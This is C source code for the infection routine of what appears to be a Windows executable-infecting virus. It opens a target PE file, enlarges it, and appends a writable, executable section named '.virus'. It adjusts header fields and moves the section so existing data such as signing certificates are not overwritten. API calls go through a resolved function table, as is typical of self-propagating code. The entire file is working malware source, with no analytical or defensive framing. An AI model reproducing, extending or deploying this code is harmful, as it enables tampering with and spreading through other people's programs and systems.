#include "infect.h"

int infect(const char* filename, data_t* data) {
  file_view_t fileView;
  IMAGE_NT_HEADERS* ntHeaders = NULL;
  IMAGE_SECTION_HEADER* sectionHeader = NULL;

  printf("infecting %s\n", filename);

  memzero(&fileView, sizeof(file_view_t));

  if (open_file_view(filename, &fileView, data) != 0){
    return 1;
  }

  if (!VERIFY_MZ(fileView.startAddress)) {
    close_file_view(&fileView, data);
    return 2;
  }
  ntHeaders = get_nt_header(fileView.startAddress);

  if (!VERIFY_MAGIC(&ntHeaders->OptionalHeader.Magic)) {
    close_file_view(&fileView, data);
    return 2;
  }

  printf("src size: %d B\n", fileView.size);

  uint32_t extendedSize = fileView.size + ntHeaders->OptionalHeader.FileAlignment + ALIGN_VALUE(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
  close_file_view(&fileView, data);
  fileView.size = extendedSize;

  if (open_file_view(filename, &fileView, data) != 0){
    return 1;
  }

  printf("ext size: %d B\n", fileView.size);

  ntHeaders = get_nt_header(fileView.startAddress);

  sectionHeader = (IMAGE_SECTION_HEADER*) (ntHeaders + 1);
  sectionHeader += ntHeaders->FileHeader.NumberOfSections;

  if (!is_section_header_empty(sectionHeader)) {
    return 7;
  }

  //File will be altered after here

  ntHeaders->OptionalHeader.SizeOfCode += ALIGN_VALUE(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
  ntHeaders->OptionalHeader.SizeOfImage += extendedSize;
  ntHeaders->FileHeader.NumberOfSections++;

  sectionHeader->Name[0] = '.';
  sectionHeader->Name[1] = 'v';
  sectionHeader->Name[2] = 'i';
  sectionHeader->Name[3] = 'r';
  sectionHeader->Name[4] = 'u';
  sectionHeader->Name[5] = 's';

  sectionHeader->Misc.VirtualSize = data->codeSize;
  sectionHeader->VirtualAddress = (sectionHeader - 1)->VirtualAddress + ALIGN_VALUE((sectionHeader - 1)->Misc.VirtualSize, ntHeaders->OptionalHeader.SectionAlignment);
  sectionHeader->SizeOfRawData = ALIGN_VALUE(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
  sectionHeader->PointerToRawData = (sectionHeader - 1)->PointerToRawData + ALIGN_VALUE((sectionHeader - 1)->SizeOfRawData, ntHeaders->OptionalHeader.FileAlignment);
  sectionHeader->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

  //To not overwrite data directory entries, like certificate in firefox.exe
  for(int i = 0; i < IMAGE_NUMBEROF_DIRECTORY_ENTRIES; i++) {
    IMAGE_DATA_DIRECTORY* ptr = &ntHeaders->OptionalHeader.DataDirectory[i];
    DWORD secStart = sectionHeader->PointerToRawData;
    DWORD secEnd = sectionHeader->PointerToRawData + sectionHeader->SizeOfRawData;
    DWORD dirStart = ptr->VirtualAddress;
    DWORD dirEnd = ptr->VirtualAddress + ptr->Size;
    if (  (secStart >= dirStart &&
          secStart < dirEnd) ||
          (secEnd >= dirStart &&
          secEnd < dirEnd) ||
          (secStart <= dirStart &&
          secEnd >= dirEnd) ) {
            sectionHeader->PointerToRawData = ALIGN_VALUE(dirEnd, ntHeaders->OptionalHeader.FileAlignment);
            printf("REPOSITIONED! from 0x%X to 0x%X\n", secStart, sectionHeader->PointerToRawData);
          }
  }

  printf("Virtual address: 0x%X\n", sectionHeader->VirtualAddress);
  printf("ptr to raw data: 0x%X\n", sectionHeader->PointerToRawData);

  data->functions.flushViewOfFile(fileView.startAddress, extendedSize);
  close_file_view(&fileView, data);

  return 0;
}

int open_file_view(const char* filename, file_view_t* fileView, data_t* data) {
  fileView->hFile = data->functions.createFileA(filename,
                            GENERIC_READ | GENERIC_WRITE,
                            FILE_SHARE_READ | FILE_SHARE_WRITE,
                            NULL,
                            OPEN_EXISTING,
                            FILE_ATTRIBUTE_NORMAL,
                            NULL);

  if (fileView->hFile == INVALID_HANDLE_VALUE) {
    return 1;
  }
  if(fileView->size == 0) {
    fileView->size = data->functions.getFileSize(fileView->hFile, NULL);
    if (fileView->size == INVALID_FILE_SIZE) {
      data->functions.closeHandle(fileView->hFile);
      return 2;
    }
  }

  fileView->hMap = data->functions.createFileMappingA(fileView->hFile,
                                            NULL,
                                            PAGE_READWRITE,
                                            0,
                                            fileView->size,
                                            NULL);

  if (fileView->hMap == NULL) {
    data->functions.closeHandle(fileView->hFile);
    return 3;
  }

  fileView->startAddress = (void*)data->functions.mapViewOfFile(fileView->hMap,
                                                                FILE_MAP_ALL_ACCESS,
                                                                0,
                                                                0,
                                                                fileView->size);
  if (fileView->startAddress == NULL) {
    data->functions.closeHandle(fileView->hMap);
    data->functions.closeHandle(fileView->hFile);
    return 4;
  }
  return 0;
}

void close_file_view(file_view_t* fileView, data_t* data) {
  data->functions.unmapViewOfFile((LPCVOID)fileView->startAddress);
  data->functions.closeHandle(fileView->hMap);
  data->functions.closeHandle(fileView->hFile);
  memset(fileView, 0, sizeof(file_view_t));
}
